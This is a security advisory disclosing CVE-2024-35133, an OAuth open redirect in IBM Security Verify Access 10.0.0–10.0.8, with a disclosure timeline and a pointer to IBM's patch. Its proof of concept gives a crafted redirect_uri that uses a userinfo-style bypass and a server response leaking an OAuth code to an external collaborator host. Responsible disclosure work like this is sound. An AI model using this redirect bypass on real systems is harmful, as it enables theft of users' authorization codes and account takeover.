# IBM Security Verify Access - Open Redirect during OAuth Flow (CVE-2024-35133)

## Table of Contents
1. [Overview](#overview)
2. [Detailed Description](#detailed-description)
3. [Proof of Concept](#proof-of-concept)
4. [Solution](#solution)
5. [Disclosure Timeline](#disclosure-timeline)
6. [References](#references)
7. [Credits](#credits)
8. [Legal Notices](#legal-notices)

## Overview

**Revision**: 1.0  
**Impact**:  
By persuading a victim to visit a specially crafted website, a remote attacker could exploit this vulnerability to spoof the URL displayed and redirect the user to a malicious website. This could allow the attacker to obtain highly sensitive information or conduct further attacks against the victim.

**Severity**:  
- NIST: High  
- IBM: Medium

**CVSS Score**:  
- NIST: 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)  
- IBM: 6.8 (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:N/I:H/A:N)

**CVE-ID**: CVE-2024-35133

**Vendor**: IBM

**Affected Products**: 
- IBM Security Verify Access  
- IBM Security Verify Access Docker

**Affected Versions**: 10.0.0 - 10.0.8

### Product Description

IBM Security Verify Access is a complete authorization and network security policy management solution. It provides end-to-end protection of resources over geographically dispersed intranets and extranets.

Some key features include:
- **Authentication**: Wide range of built-in authenticators and support for external authenticators.
- **Authorization**: Secure permit and deny decisions for protected resource requests.
- **Data Security and Centralized Resource Management**: Manages secure access to internal network-based resources using public Internet connectivity through a corporate firewall system.

---

## Detailed Description

During a penetration test of the OAuth flow for a client, an Open Redirect vulnerability was discovered, allowing the leakage of the OAuth "code" variable.

By bypassing the parser's logic responsible for verifying the "redirect_uri" parameter during an OAuth flow (leveraging RFC 3986), the attacker could manipulate the domain whitelist filter in IBM Security Verify Access. This resulted in an open redirect to any arbitrary domain controlled by the attacker. The victim could be redirected to a malicious site while the domain appears trusted.

This could lead to the exposure of sensitive information like the OAuth "code" token or further attacks against the victim.

---

## Proof of Concept

### Request
```http
GET /oauth/oauth20/authorize?response_type=code&client_id=[REDACTED]&state=001710863806728MPUw0xFSj&REDACTED_uri=https://legitimate.domain:bypass@0lmd9sa7p0cez16vdcldhcgygpmga6yv.oastify.com/[REDACTED]/openid/REDACTED/[REDACTED]&scope=openid+ HTTP/1.1
Host: [REDACTED]
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close
```
### Response
```http
HTTP/1.1 302 Found 
content-language: en-US 
date: Tue, 19 Mar 2024 16:04:35 GMT 
location: https://legitimate.domain:bypass@0lmd9sa7p0cez16vdcldhcgygpmga6yv.oastify.com/[REDACTED]/openid/REDACTED/[REDACTED]?state=001710863806728MPUw0xFSj&code=7wkH581y0uyS0nm4ff65zCqHn0WC46w7v&iss=[REDACTED] 
p3p: CP="NON CUR OTPi OUR NOR UNI" 
x-frame-options: DENY 
x-content-type-options: nosniff 
cache-control: no-store 
x-xss-protection: 1; mode=block 
x-permitted-cross-domain-policies: none 
cross-origin-resource-policy: same-site 
content-security-policy: frame-ancestors 'none' 
referrer-policy: no-referrer-when-downgrade 
strict-transport-security: max-age=31536000; includeSubDomains 
pragma: no-cache 
Content-Length: 0.
```

## Solution

Refer to IBM Security Bulletin 7166712 for patch, upgrade, or suggested workaround information.  
See [References](#references) for more details.

---

## Disclosure Timeline

- **19/03/2024**: Vulnerability discovered by the Security Researcher (Giulio Garzia)
- **21/03/2024**: Vulnerability shared with the client relying on IBM Security Verify Access
- **02/04/2024**: Vulnerability reported to IBM
- **14/05/2024**: Vulnerability confirmed by IBM
- **18/07/2024**: Pre-release patch provided by IBM to the customer
- **27/08/2024**: Security Bulletin and vulnerability shared by IBM

---

## References

1. [IBM Security Bulletin CVE-2024-35133](https://www.ibm.com/support/pages/security-bulletin-security-vulnerability-was-fixed-ibm-security-verify-access-cve-2024-35133)
2. [IBM X-Force Vulnerability Database](https://exchange.xforce.ibmcloud.com/vulnerabilities/291026)
3. [NIST CVE-2024-35133](https://nvd.nist.gov/vuln/detail/CVE-2024-35133)
4. [CWE-178: Improper Handling of URL](https://cwe.mitre.org/data/definitions/178.html)

---

## Credits

This vulnerability was discovered and reported by:

- **Giulio Garzia**  
  [LinkedIn](https://www.linkedin.com/in/giuliogarzia/)  
  [GitHub](https://github.com/Ozozuz)

---

## Legal Notices

Copyright (c) 2024 Giulio Garzia "Ozozuz"

Permission is granted for electronic redistribution of this alert. It may not be edited without explicit written consent. For permission to reprint this alert in other media, contact the author.

_Disclaimer_: The information in this advisory is accurate at the time of publishing based on available data. No warranties are provided. Neither the author nor publisher accepts liability for direct, indirect, or consequential damage arising from use of this information.